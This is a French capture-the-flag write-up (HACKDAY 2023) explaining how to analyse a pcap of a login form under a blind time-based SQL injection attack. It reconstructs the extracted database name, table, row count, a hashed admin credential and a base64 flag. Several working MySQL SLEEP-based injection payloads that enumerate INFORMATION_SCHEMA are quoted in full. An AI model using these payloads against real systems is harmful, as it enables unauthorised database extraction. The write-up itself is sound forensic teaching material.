Waiting for love
Write-up HACKDAY 2023
On a un fichier pcap. On voit vite que c’est un échange HTTP. On a une première requête GET /index.html : 
  



Il s’agit d’un simple formulaire de connection
On retrouve ensuite la requête post /login pour du login : 
  

On retrouve ensuite des tentatives d’injections SQL sur le champ login avec des payloads de ce type : 
```text
"login" = "test(',(..((.""
"login" = "test') AND 7126=4660 AND ('xvIk'='xvIk"
```
	

Au bout d’un moment, les requêtes SQL se ressemblent, on peut donc en déduire que l’injection a réussi et que les données sont en train d'être infiltrées, avec ce payload : 
```sql
"login" = "test' AND (SELECT 1467 FROM (SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>64,0,5)))))HDfI) AND 'PhVR'='PhVR"
```
	

On voit qu’il s’agit ici d’un payload de type time-based (SLEEP 5). Mais quelle info est cherchée ? Le nom de la base de données (DATABASE()). Comme l’attaquant est en blind, il est obligé d’ y aller caractère par caractère. L’attaquant utilise l'encodage décimal. Sur ce payload, c’est 64 qui est tenté, soit @. 
________________


L'exécution en blind prend beaucoup de temps, donc l’attaquant a recours à l'utilisation de > et < afin d’aller plus vite. A un moment, on tombe sur ce genre de requête :  
```sql
"login" = "test' AND (SELECT 1467 FROM (SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))!=104,0,5)))))HDfI) AND 'PhVR'='PhVR"
```
	

On voit ici qu’il s’agit d’une confirmation pour savoir si le caractère est bien égale à 104. En effet s' il est egale, le temps de réponse sera immédiat et on aura pas le sleep : 
  

On a effectivement un temps de réponse quasi instantané. Le premier caractère est donc 104, soit un h.
On peut alors construire un filtre wireshark custom afin de filtrer uniquement les valeurs de validation : 
```text
urlencoded-form.value contains "!="
```
	

Dans les premier paquets, qui concernent le nom de la base de donnée, on retrouve le nom suivant : hackday


On continue sur cette voie, l’étape suivante d’une sqli consiste à récupérer le nombre de tables. Qu'à cela ne tienne : 

```sql
test' AND (SELECT 1004 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x6861636b646179),1,1))!=49,0,5)))))FDMx) AND 'ekjM'='ekjM
```
	

Cette requête demande le nombre de table présente : un 49, soit 1, donc une seule table.


On continue ensuite avec le nom de cette table : 

```sql
test' AND (SELECT 6092 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x6861636b646179 LIMIT 0,1),1,1))!=117,0,5)))))rqpd) AND 'zDJe'='zDJe
```

Ici, la première lettre est un 117, soit un u. On peut continuer à recomposer le nom de la table et on obtient users


________________


On continue dans la même logique, avec le nombre de champs  : 
```sql
"login" = "test' AND (SELECT 5667 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM hackday.users),1,1))!=50,0,5)))))mEev) AND 'PHOT'='PHOT"
```	


50, un 2


En continuant, on s'aperçoit que la base de données a été entièrement dumpé, et on retrouve un premier compte : 
```text
admin:dfa3be6a14050f4614757b69be608a42
```

Il s’agit d’un md5, qui n’est pas connu, dans rockyou ou dans les autres sites en ligne. 



Mais un second compte est présent : 
```text
test:SEFDS0RBWXtUMU0zXzg0NTNEXzVRTDF9
```
Cette fois, ci, un petit passage dans cyber chef pour nous dire qu’il s’agit de base64, et on a le flag : 
```text
HACKDAY{T1M3_8453D_5QL1}
```
	

Il est tout de même possible de reconstituer toutes les requêtes une par une à la main, mais beaucoup plus lentement.

